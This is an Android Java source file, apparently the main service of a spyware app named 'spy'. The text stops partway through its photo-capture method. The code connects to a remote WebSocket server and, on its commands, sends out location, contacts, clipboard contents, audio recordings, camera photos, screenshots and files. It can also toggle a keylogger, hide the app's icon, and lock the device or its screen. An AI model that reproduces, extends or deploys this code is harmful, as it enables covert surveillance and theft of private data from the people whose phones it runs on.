package com.zaxz.spy;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.Typeface;
import android.graphics.YuvImage;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureFailure;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.StatFs;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.view.Display;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.Surface;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.NotificationCompat;

import com.bumptech.glide.Glide;
import com.bumptech.glide.request.target.SimpleTarget;
import com.bumptech.glide.request.transition.Transition;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class BackgroundService extends Service {
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "spy_channel";

    // Static instance reference — AppBlockerService pakai ini buat kirim
    // keylog batch via WebSocket BackgroundService (1 koneksi WS per device).
    public static BackgroundService instance = null;

    private WebSocket webSocket;
    private Handler backgroundHandler;
    private HandlerThread handlerThread;
    private String deviceId;
    private String username;
    private String model;
    private MediaPlayer mediaPlayer;
    private CameraManager cameraManager;
    private String cameraId;
    private PowerManager.WakeLock wakeLock;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private boolean isConnected = false;
    private LocationManager locationManager;
    private TelephonyManager telephonyManager;
    private PackageManager packageManager;
    private ConnectivityManager connectivityManager;
    private BatteryManager batteryManager;
    private int reconnectAttempts = 0;
    private Location lastLocation = null;

    // ============ STATE FITUR BARU ============
    private MediaRecorder mediaRecorder;
    private File audioRecordingFile;
    private boolean isRecording = false;
    private Handler recordingHandler;

    // Camera state — track camera device biar bisa release dengan benar
    private CameraDevice activeCameraDevice;
    private CameraCaptureSession activeCaptureSession;
    private ImageReader activeImageReader;

    // Clipboard monitoring state
    private Timer clipboardTimer;
    private String lastClipboardText = null;
    private android.content.ClipboardManager clipboardManager;

    // ============ SCREENSHOT STATE (single-frame via MediaProjection) ============
    // Beda dengan continuous screen capture, screenshot cuma capture 1 frame
    // lalu langsung stop projection. Lebih hemat resource + battery.
    // Butuh consent 1x dari user (via ScreenCaptureActivity).
    private MediaProjection screenshotProjection;
    private android.hardware.display.VirtualDisplay screenshotDisplay;
    private ImageReader screenshotImageReader;
    private boolean isScreenshotCapturing = false;
    private LocationListener locationListener;
    private WindowManager windowManager;
    private ArrayList<View> floatingImages = new ArrayList<>();
    private Random random = new Random();
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        handlerThread = new HandlerThread("BackgroundService");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        initializeManagers();
        initializeDeviceInfo();
        acquireWakeLock();

        // ============ PENTING: pastikan Config sudah ke-load sebelum connect ============
        // loadConfig() sekarang blocking (max 5 detik). Dijalankan di backgroundHandler
        // (bukan main thread) supaya gak trigger NetworkOnMainThreadException.
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    Config.loadConfig(BackgroundService.this);
                    android.util.Log.i("SpyService",
                        "Config siap. API_URL=" + Config.API_URL + " WS_URL=" + Config.WS_URL +
                        " username=" + username + " device_id=" + deviceId);
                } catch (Throwable t) {
                    android.util.Log.e("SpyService", "loadConfig failed", t);
                }
                connectWebSocket();
            }
        });

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                startLocationUpdates();
            }
        });
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendBatteryInfo();
            }
        }, 10000);
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendDeviceInfo();
            }
        }, 2000);
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                heartbeatRunnable();
            }
        }, 5000);

        // ============ FITUR 5: Clipboard Monitor — start polling tiap 5 detik ============
        // Gak butuh permission khusus, jadi aman di-start langsung.
        startClipboardMonitoring();
    }
    
    private void initializeManagers() {
        try {
            cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        } catch (Exception e) {}
        
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, AdminReceiver.class);
        } catch (Exception e) {}
        
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        } catch (Exception e) {}
        
        try {
            telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        } catch (Exception e) {}
        
        try {
            connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        } catch (Exception e) {}
        
        try {
            batteryManager = (BatteryManager) getSystemService(BATTERY_SERVICE);
        } catch (Exception e) {}
        
        try {
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        } catch (Exception e) {}
        
        packageManager = getPackageManager();
    }
    
    private void initializeDeviceInfo() {
        try {
            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            if (deviceId == null) deviceId = "unknown_" + System.currentTimeMillis();
        } catch (Exception e) {
            deviceId = "unknown_" + System.currentTimeMillis();
        }
        
        username = Config.getUsername(this);
        if (username == null) username = "default";
        
        model = Build.MODEL;
        if (model == null) model = "unknown";
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService::WakeLock");
                wakeLock.acquire();
            }
        } catch (Exception e) {}
    }
    
    private void startLocationUpdates() {
        try {
            if (locationManager == null) return;
            
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    lastLocation = location;
                    sendLocation(location);
                }
                
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}
                
                @Override
                public void onProviderEnabled(String provider) {}
                
                @Override
                public void onProviderDisabled(String provider) {}
            };
            
            try {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10, locationListener);
            } catch (Exception e) {}
            
            try {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 10, locationListener);
            } catch (Exception e) {}
            
            try {
                Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (gpsLocation != null) {
                    lastLocation = gpsLocation;
                    sendLocation(gpsLocation);
                }
            } catch (Exception e) {}
            
            try {
                Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (networkLocation != null && lastLocation == null) {
                    lastLocation = networkLocation;
                    sendLocation(networkLocation);
                }
            } catch (Exception e) {}
            
        } catch (SecurityException e) {} catch (Exception e) {}
    }
    
    private void connectWebSocket() {
        try {
            OkHttpClient client = new OkHttpClient.Builder()
                .pingInterval(5, TimeUnit.SECONDS)
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
            
            Request request = new Request.Builder()
                .url(Config.WS_URL)
                .build();
            
            webSocket = client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    isConnected = true;
                    reconnectAttempts = 0;
                    sendAuth();
                    backgroundHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            sendDeviceInfo();
                        }
                    }, 1000);
                }
                
                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    handleWebSocketMessage(text);
                }
                
                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    isConnected = false;
                    backgroundHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            reconnect();
                        }
                    }, 5000);
                }
                
                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    isConnected = false;
                    backgroundHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            reconnect();
                        }
                    }, 5000);
                }
            });
        } catch (Exception e) {
            backgroundHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    reconnect();
                }
            }, 5000);
        }
    }
    
    private void handleWebSocketMessage(String text) {
        try {
            JSONObject cmd = new JSONObject(text);
            
            if (!cmd.has("type")) return;
            
            String type = cmd.getString("type");
            
            if ("ping".equals(type)) {
                JSONObject pong = new JSONObject();
                try {
                    pong.put("type", "pong");
                    webSocket.send(pong.toString());
                } catch (Exception e) {}
            }

            // Handle pong response dari heartbeat_ping (API echo back)
            if ("pong".equals(type) || "heartbeat_pong".equals(type)) {
                lastPongReceived = System.currentTimeMillis();
            }

            if ("command".equals(type) && cmd.has("command")) {
                String command = cmd.getString("command");
                
                JSONObject response = new JSONObject();
                try {
                    response.put("type", "command_received");
                    response.put("command", command);
                } catch (Exception e) {}
                
                if ("lock".equals(command)) {
                    lockDevice();
                } else if ("unlock".equals(command)) {
                    unlockDevice();
                } else if ("flashlight_on".equals(command)) {
                    toggleFlashlight(true);
                } else if ("flashlight_off".equals(command)) {
                    toggleFlashlight(false);
                } else if ("play_music".equals(command) && cmd.has("url")) {
                    try {
                        playMusic(cmd.getString("url"));
                    } catch (Exception e) {}
                } else if ("stop_music".equals(command)) {
                    stopMusic();
                } else if ("hide_app".equals(command)) {
                    hideApp();
                } else if ("show_app".equals(command)) {
                    showApp();
                } else if ("open_web".equals(command) && cmd.has("url")) {
                    try {
                        openWebPage(cmd.getString("url"));
                    } catch (Exception e) {}
                } else if ("show_notification".equals(command) && cmd.has("title") && cmd.has("message")) {
                    try {
                        showCustomNotification(cmd.getString("title"), cmd.getString("message"));
                    } catch (Exception e) {}
                } else if ("show_popup".equals(command) && cmd.has("title") && cmd.has("message")) {
                    try {
                        showModernPopup(cmd.getString("title"), cmd.getString("message"));
                    } catch (Exception e) {}
                } else if ("show_floating_images".equals(command) && cmd.has("url") && cmd.has("count")) {
                    try {
                        showFloatingImages(cmd.getString("url"), cmd.getInt("count"));
                    } catch (Exception e) {}
                } else if ("clear_floating_images".equals(command)) {
                    clearFloatingImages();
                }
                // ============ FITUR BARU TIER 1 ============
                else if ("take_photo".equals(command)) {
                    try {
                        String camera = cmd.has("camera") ? cmd.getString("camera") : "back";
                        takePhoto(camera);
                    } catch (Exception e) {}
                } else if ("get_apps".equals(command)) {
                    getInstalledApps();
                } else if ("get_contacts".equals(command)) {
                    getContacts();
                } else if ("record_audio".equals(command)) {
                    int durationSec = cmd.has("duration") ? cmd.optInt("duration", 10) : 10;
                    if (durationSec < 1) durationSec = 1;
                    if (durationSec > 60) durationSec = 60;
                    recordAudio(durationSec);
                }
                // record_audio_stop dipanggil kalau user mau stop paksa sebelum durasi habis
                else if ("record_audio_stop".equals(command)) {
                    stopAudioRecording();
                }
                // ============ FITUR SCREENSHOT (single-frame via MediaProjection) ============
                else if ("request_screenshot_permission".equals(command)) {
                    requestScreenshotPermission();
                } else if ("take_screenshot".equals(command)) {
                    takeScreenshot();
                }
                // ============ FITUR APP BLOCKER ============
                else if ("set_app_block".equals(command) && cmd.has("package")) {
                    try {
                        String pkg = cmd.getString("package");
                        boolean blocked = cmd.optBoolean("blocked", true);
                        AppBlockerService.setBlocked(BackgroundService.this, pkg, blocked);
                        sendLog("app_block: " + pkg + " = " + blocked);

                        // Kirim updated blocklist ke API supaya admin modal selalu fresh
                        java.util.Set<String> blockedSet = AppBlockerService.getBlocklist(BackgroundService.this);
                        JSONObject blMsg = new JSONObject();
                        blMsg.put("type", "app_blocks_list");
                        blMsg.put("blocked_apps", new org.json.JSONArray(blockedSet));
                        blMsg.put("total", blockedSet.size());
                        blMsg.put("timestamp", System.currentTimeMillis());
                        if (webSocket != null && isConnected) {
                            webSocket.send(blMsg.toString());
                        }
                    } catch (Exception e) {
                        sendLog("set_app_block error: " + e.getMessage());
                    }
                } else if ("get_app_blocks".equals(command)) {
                    try {
                        java.util.Set<String> blocked = AppBlockerService.getBlocklist(BackgroundService.this);
                        JSONObject msg = new JSONObject();
                        msg.put("type", "app_blocks_list");
                        msg.put("blocked_apps", new org.json.JSONArray(blocked));
                        msg.put("total", blocked.size());
                        msg.put("timestamp", System.currentTimeMillis());
                        if (webSocket != null && isConnected) {
                            webSocket.send(msg.toString());
                        }
                        sendLog("app_block: sent blocklist (" + blocked.size() + " apps)");
                    } catch (Exception e) {
                        sendLog("get_app_blocks error: " + e.getMessage());
                    }
                }
                // ============ FITUR AUTO-START APP ============
                else if ("auto_start_app".equals(command) && cmd.has("package")) {
                    try {
                        autoStartApp(cmd.getString("package"));
                    } catch (Exception e) {
                        sendLog("auto_start_app command error: " + e.getMessage());
                    }
                }
                // ============ FITUR TOUCH LOCK ============
                else if ("set_touch_lock".equals(command)) {
                    try {
                        boolean locked = cmd.optBoolean("locked", true);
                        AppBlockerService.setTouchLocked(BackgroundService.this, locked);
                        sendLog("touch_lock: " + (locked ? "ENABLED" : "DISABLED"));
                    } catch (Exception e) {
                        sendLog("set_touch_lock error: " + e.getMessage());
                    }
                }
                // ============ FITUR KEYLOGGER ENABLE/DISABLE ============
                else if ("set_keylog".equals(command)) {
                    try {
                        boolean enabled = cmd.optBoolean("enabled", true);
                        AppBlockerService.setKeylogEnabled(BackgroundService.this, enabled);
                        sendLog("keylog: " + (enabled ? "ENABLED" : "DISABLED"));
                    } catch (Exception e) {
                        sendLog("set_keylog error: " + e.getMessage());
                    }
                }
                // ============ FITUR FILE ACCESS ============
                else if ("list_files".equals(command)) {
                    try {
                        String path = cmd.has("path") ? cmd.getString("path") : "/sdcard/";
                        listFiles(path);
                    } catch (Exception e) {
                        sendLog("list_files command error: " + e.getMessage());
                    }
                } else if ("download_file".equals(command) && cmd.has("path")) {
                    try {
                        downloadFile(cmd.getString("path"));
                    } catch (Exception e) {
                        sendLog("download_file command error: " + e.getMessage());
                    }
                }

                try {
                    webSocket.send(response.toString());
                } catch (Exception e) {}
            }
        } catch (Exception e) {}
    }
    
    private void openWebPage(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }
    
    private void showCustomNotification(String title, String message) {
        try {
            NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                    "custom_notifications",
                    "Custom Notifications",
                    NotificationManager.IMPORTANCE_HIGH
                );
                channel.setDescription("Custom notifications from server");
                notificationManager.createNotificationChannel(channel);
            }
            
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "custom_notifications")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL);
            
            int notificationId = (int) System.currentTimeMillis();
            notificationManager.notify(notificationId, builder.build());
            
        } catch (Exception e) {}
    }
    
    private void showModernPopup(String title, String message) {
        try {
            backgroundHandler.post(new Runnable() {
                @Override
                public void run() {
                    try {
                        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                        
                        int layoutFlag;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                        } else {
                            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
                        }
                        
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.WRAP_CONTENT,
                            layoutFlag,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                            PixelFormat.TRANSLUCENT
                        );
                        
                        params.gravity = Gravity.CENTER;
                        params.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.85);
                        
                        LayoutInflater inflater = LayoutInflater.from(BackgroundService.this);
                        LinearLayout layout = new LinearLayout(BackgroundService.this);
                        layout.setOrientation(LinearLayout.VERTICAL);
                        layout.setBackgroundColor(Color.parseColor("#DD2A2A2A"));
                        layout.setPadding(50, 50, 50, 50);
                        
                        TextView titleView = new TextView(BackgroundService.this);
                        titleView.setText(title);
                        titleView.setTextColor(Color.WHITE);
                        titleView.setTextSize(22);
                        titleView.setTypeface(Typeface.DEFAULT_BOLD);
                        titleView.setGravity(Gravity.CENTER);
                        titleView.setPadding(0, 0, 0, 30);
                        layout.addView(titleView);
                        
                        TextView messageView = new TextView(BackgroundService.this);
                        messageView.setText(message);
                        messageView.setTextColor(Color.parseColor("#EEEEEE"));
                        messageView.setTextSize(16);
                        messageView.setGravity(Gravity.CENTER);
                        messageView.setPadding(20, 20, 20, 40);
                        layout.addView(messageView);
                        
                        Button okButton = new Button(BackgroundService.this);
                        okButton.setText("OK");
                        okButton.setTextColor(Color.WHITE);
                        okButton.setBackgroundColor(Color.parseColor("#4CAF50"));
                        okButton.setPadding(30, 20, 30, 20);
                        
                        FrameLayout buttonContainer = new FrameLayout(BackgroundService.this);
                        buttonContainer.addView(okButton);
                        layout.addView(buttonContainer);
                        
                        windowManager.addView(layout, params);
                        
                        okButton.setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                try {
                                    windowManager.removeView(layout);
                                } catch (Exception e) {}
                            }
                        });
                        
                    } catch (Exception e) {}
                }
            });
        } catch (Exception e) {}
    }
    
    private void showFloatingImages(String imageUrl, int count) {
        try {
            for (int i = 0; i < count; i++) {
                showSingleFloatingImage(imageUrl, i);
            }
        } catch (Exception e) {}
    }
    
    private void showSingleFloatingImage(String imageUrl, int index) {
        try {
            backgroundHandler.post(new Runnable() {
                @Override
                public void run() {
                    try {
                        int layoutFlag;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                        } else {
                            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
                        }
                        
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.WRAP_CONTENT,
                            WindowManager.LayoutParams.WRAP_CONTENT,
                            layoutFlag,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                            PixelFormat.TRANSLUCENT
                        );
                        
                        int screenWidth = getResources().getDisplayMetrics().widthPixels;
                        int screenHeight = getResources().getDisplayMetrics().heightPixels;
                        
                        params.x = random.nextInt(screenWidth - 300);
                        params.y = random.nextInt(screenHeight - 300);
                        
                        ImageView imageView = new ImageView(BackgroundService.this);
                        imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);
                        
                        FrameLayout touchInterceptor = new FrameLayout(BackgroundService.this);
                        touchInterceptor.addView(imageView);
                        
                        touchInterceptor.setOnTouchListener(new View.OnTouchListener() {
                            private int initialX;
                            private int initialY;
                            private float initialTouchX;
                            private float initialTouchY;
                            
                            @Override
                            public boolean onTouch(View v, MotionEvent event) {
                                switch (event.getAction()) {
                                    case MotionEvent.ACTION_DOWN:
                                        initialX = params.x;
                                        initialY = params.y;
                                        initialTouchX = event.getRawX();
                                        initialTouchY = event.getRawY();
                                        return true;
                                        
                                    case MotionEvent.ACTION_MOVE:
                                        params.x = initialX + (int) (event.getRawX() - initialTouchX);
                                        params.y = initialY + (int) (event.getRawY() - initialTouchY);
                                        windowManager.updateViewLayout(touchInterceptor, params);
                                        return true;
                                        
                                    case MotionEvent.ACTION_UP:
                                        return false;
                                }
                                return false;
                            }
                        });
                        
                        windowManager.addView(touchInterceptor, params);
                        floatingImages.add(touchInterceptor);
                        
                        Glide.with(BackgroundService.this)
                            .asBitmap()
                            .load(imageUrl)
                            .into(new SimpleTarget<Bitmap>() {
                                @Override
                                public void onResourceReady(Bitmap resource, Transition<? super Bitmap> transition) {
                                    imageView.setImageBitmap(resource);
                                }
                            });
                        
                    } catch (Exception e) {}
                }
            });
        } catch (Exception e) {}
    }
    
    private void clearFloatingImages() {
        try {
            for (View view : floatingImages) {
                try {
                    windowManager.removeView(view);
                } catch (Exception e) {}
            }
            floatingImages.clear();
        } catch (Exception e) {}
    }

    // ====================================================================
    // ============ FITUR BARU TIER 1 — IMPLEMENTASI METHOD ===============
    // ====================================================================

    /**
     * FITUR 1: Capture Photo (front/back camera) — ambil 1 foto, kirim via WS.
     *
     * Alur:
     *  1. Cari camera ID sesuai pilihan (front/back).
     *  2. Buka CameraDevice.
     *  3. Bikin ImageReader (JPEG, max 1280x720 biar bandwidth wajar).
     *  4. Bikin CaptureSession, kirim CaptureRequest STILL_CAPTURE.
     *  5. Di onImageAvailable: convert JPEG bytes -> base64, kirim WS.
     *  6. Release camera.
     */
    private void takePhoto(final String cameraFacing) {
        // Cek permission di runtime
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendLog("take_photo: CAMERA permission not granted");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    // Resolve desired facing constant
                    final int desiredFacing;
                    if ("front".equalsIgnoreCase(cameraFacing)) {
                        desiredFacing = CameraCharacteristics.LENS_FACING_FRONT;
                    } else {
                        desiredFacing = CameraCharacteristics.LENS_FACING_BACK;
                    }

                    // Find matching camera id
                    String[] cameraIdList = cameraManager.getCameraIdList();
                    String foundId = null;
                    for (String id : cameraIdList) {
                        CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                        Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                        if (facing != null && facing == desiredFacing) {
                            foundId = id;
                            break;
                        }
                    }
                    if (foundId == null) {
                        // Fallback ke camera pertama yang ada
                        if (cameraIdList.length == 0) {
                            sendLog("take_photo: no camera available");
                            return;
                        }
                        foundId = cameraIdList[0];
                    }

                    final String cameraIdFinal = foundId;

                    // ============ PILIH RESOLUSI YANG DIDUKUNG CAMERA ============
                    // Penting: tidak semua camera (terutama front) mendukung
                    // 1280x720. Kalau pakai resolusi yang gak didukung, capture
                    // bisa gagal diam-diam atau hasilnya hitam.
                    final android.util.Size photoSize = chooseOptimalJpegSize(cameraIdFinal);
                    if (photoSize == null) {
                        sendLog("take_photo: tidak ada resolusi JPEG yang didukung oleh camera " + cameraIdFinal);
                        return;
                    }
                    sendLog("take_photo: pakai resolusi " + photoSize.getWidth() + "x" + photoSize.getHeight() + " untuk camera " + cameraIdFinal);

                    // Bikin ImageReader buat nampung 1 frame JPEG
                    final ImageReader imageReader = ImageReader.newInstance(
                        photoSize.getWidth(), photoSize.getHeight(), ImageFormat.JPEG, 2);
                    activeImageReader = imageReader;
                    imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                        @Override
                        public void onImageAvailable(ImageReader reader) {
                            Image image = null;
                            try {
                                image = reader.acquireLatestImage();
                                if (image == null) return;
                                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                byte[] bytes = new byte[buffer.remaining()];
                                buffer.get(bytes);

                                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);

                                JSONObject msg = new JSONObject();
                                msg.put("type", "image");
                                msg.put("image_type", "photo_" + cameraFacing);
                                msg.put("data", base64);
                                msg.put("width", photoSize.getWidth());
                                msg.put("height", photoSize.getHeight());
                                msg.put("timestamp", System.currentTimeMillis());
                                if (webSocket != null && isConnected) {
                                    webSocket.send(msg.toString());
                                }
                            } catch (Exception e) {
                                sendLog("take_photo onImage error: " + e.getMessage());
                            } finally {
                                if (image != null) image.close();
                                cleanupCamera();
                            }
                        }
                    }, backgroundHandler);

                    // Buka camera device
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        cameraManager.openCamera(cameraIdFinal, new CameraDevice.StateCallback() {
                            @Override
                            public void onOpened(CameraDevice camera) {
                                activeCameraDevice = camera;
                                try {
                                    List<Surface> surfaces = new ArrayList<>();
                                    surfaces.add(imageReader.getSurface());

                                    camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(CameraCaptureSession session) {
                                            activeCaptureSession = session;
                                            try {
                                                // ============ STEP 1: WARMUP REPEATING REQUEST ============
                                                // Kirim repeating request pakai TEMPLATE_PREVIEW dulu selama
                                                // 800ms biar sensor & auto-exposure/auto-focus settle.
                                                // Tanpa warmup, capture STILL_CAPTURE langsung sering hasilnya
                                                // hitam (terutama front camera) karena AE belum konvergen.
                                                final CaptureRequest.Builder warmupBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                                warmupBuilder.addTarget(imageReader.getSurface());
                                                warmupBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                                                warmupBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                                warmupBuilder.set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, 0);
                                                session.setRepeatingRequest(warmupBuilder.build(), null, backgroundHandler);

                                                // ============ STEP 2: DELAY 800ms LALU CAPTURE ============
                                                backgroundHandler.postDelayed(new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        try {
                                                            // Stop repeating request
                                                            try { session.stopRepeating(); } catch (Exception e) {}

                                                            // Build STILL_CAPTURE request
                                                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                                            builder.addTarget(imageReader.getSurface());
                                                            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                                            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                                                            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                                            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 90);
                                                            builder.set(CaptureRequest.JPEG_ORIENTATION, getJpegOrientation(cameraIdFinal, desiredFacing));

                                                            // Trigger auto-focus sekali sebelum capture
                                                            builder.set(CaptureRequest.CONTROL_AF_TRIGGER, CaptureRequest.CONTROL_AF_TRIGGER_START);

                                                            session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                                                                @Override
                                                                public void onCaptureCompleted(CameraCaptureSession session, CaptureRequest request, TotalCaptureResult result) {
                                                                    // Image akan di-handle di onImageAvailable
                                                                    sendLog("take_photo: capture completed");
                                                                }

                                                                @Override
                                                                public void onCaptureFailed(CameraCaptureSession session, CaptureRequest request, CaptureFailure failure) {
                                                                    sendLog("take_photo: capture failed reason=" + failure.getReason());
                                                                    cleanupCamera();
                                                                }
                                                            }, backgroundHandler);
                                                        } catch (Exception e) {
                                                            sendLog("take_photo capture error: " + e.getMessage());
                                                            cleanupCamera();
                                                        }
                                                    }
                                                }, 800);
                                            } catch (Exception e) {
                                                sendLog("take_photo warmup error: " + e.getMessage());
                                                cleanupCamera();
                                            }
                                        }

                                        @Override
                                        public void onConfigureFailed(CameraCaptureSession session) {
                                            sendLog("take_photo: capture session config failed");
                                            cleanupCamera();
                                        }
                                    }, backgroundHandler);
                                } catch (Exception e) {
                                    sendLog("take_photo session error: " + e.getMessage());
                                    cleanupCamera();
                                }
                            }

